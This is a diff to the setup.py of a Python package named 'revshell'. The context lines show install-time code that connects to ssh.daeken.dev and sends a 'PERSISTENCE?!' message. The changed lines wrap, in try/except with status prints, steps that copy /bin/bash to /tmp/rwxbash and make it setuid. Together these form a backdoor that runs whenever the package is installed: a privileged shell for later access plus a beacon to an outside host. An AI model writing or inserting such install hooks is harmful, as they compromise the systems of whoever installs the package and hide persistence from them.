@@ -9,10 +9,14 @@ if(os.path.exists('/tmp/sbash')):
 	s.connect(('ssh.daeken.dev', 12347))
 	s.write('PERSISTENCE?!\n')
 	s.close()
-subprocess.check_output(['cp', '/bin/bash', '/tmp/rwxbash'])
-subprocess.check_output(['chown', 'rwx', '/tmp/rwxbash'])
-subprocess.check_output(['chmod', '4555', '/tmp/rwxbash'])
-subprocess.check_output(['chmod', 'u+s', '/tmp/rwxbash'])
+try:
+	subprocess.check_output(['cp', '/bin/bash', '/tmp/rwxbash'])
+	subprocess.check_output(['chown', 'rwx', '/tmp/rwxbash'])
+	subprocess.check_output(['chmod', '4555', '/tmp/rwxbash'])
+	subprocess.check_output(['chmod', 'u+s', '/tmp/rwxbash'])
+	print 'Set up rwxbash'
+except:
+	print 'Couldn\'t set up rwxbash?'
 
 setup(
 	name='revshell',
